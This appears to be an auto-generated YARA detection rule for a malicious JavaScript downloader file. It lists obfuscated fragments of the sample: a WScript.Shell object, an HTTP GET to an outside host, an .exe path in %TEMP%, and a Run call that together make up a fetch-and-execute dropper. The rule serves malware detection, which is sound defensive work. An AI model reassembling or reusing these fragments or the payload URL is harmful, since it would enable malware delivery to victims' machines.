rule sig_20160330_7d44c29fbbb7f7104946a6ddf9e22aae {
  meta:
    description = "datamaliciousorder - file 20160330_7d44c29fbbb7f7104946a6ddf9e22aae.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1924ed8171997cac58e63b9ffec446dea2722feb0f6a98ea587ffd95fa6a9e1a"

  strings:
    $s1  = "var ZN = function B() {return WScript[DG](\"WScript\"+\".Shell\");}(), R = 11;" fullword ascii
    $s2  = "D[FR](\"GET\", \"http://buygrocery.nz/l7dsp\", false);" fullword ascii
    $s3  = "function SM(GG, K0){PJ = PJ * 1; return GG - K0;};" fullword ascii
    $s4  = "if (D[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function JY0(){return QP + \"\";};" fullword ascii
    $s6  = "function JY() {return ZN[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"c4DpbtppLc4YHgf.ex\" + \"e\";};" fullword ascii
    $s7  = "function B0(F){ZN[\"Run\"](F, PJ, PJ);};" fullword ascii
    $s8  = "function Q() {return ((KJ == true) && (KJ == E0)) ? 1 : PJ;};" fullword ascii
    $s9  = "function N()" fullword ascii
    $s10 = "function HT(){return 22;};" fullword ascii
    $s11 = "function G(){return DG;};" fullword ascii
    $s12 = "function K(EF) {var E = (1, 2, 3, 4, 5, EF); return E;};" fullword ascii
    $s13 = "}while (JD);" fullword ascii
    $s14 = "return SM(N0, YK);" fullword ascii
    $s15 = "var T0 = new this[\"Date\"]();" fullword ascii
    $s16 = "var E0 = false;" fullword ascii
    $s17 = "E0 = true; " fullword ascii
    $s18 = "var FB = false;" fullword ascii
    $s19 = "var KJ = false;" fullword ascii
    $s20 = "KJ = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}